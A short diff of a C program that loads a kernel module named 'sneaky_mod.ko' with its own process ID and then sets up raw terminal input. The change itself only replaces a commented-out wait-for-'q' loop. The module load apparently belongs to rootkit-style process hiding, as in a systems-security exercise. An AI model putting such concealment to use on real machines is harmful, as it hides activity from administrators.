@@ -79,10 +79,7 @@ int main() {
     sprintf(cmd, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
     system(cmd);
     
-    // wait for the q to quit
-    // char c;
-    // while ((c = getchar()) != 'q') {
-    // }
+    // wait for the q to quit, don't need to press enter after q
     struct termios oldt, newt;
     tcgetattr(STDIN_FILENO, &oldt);
     newt = oldt;
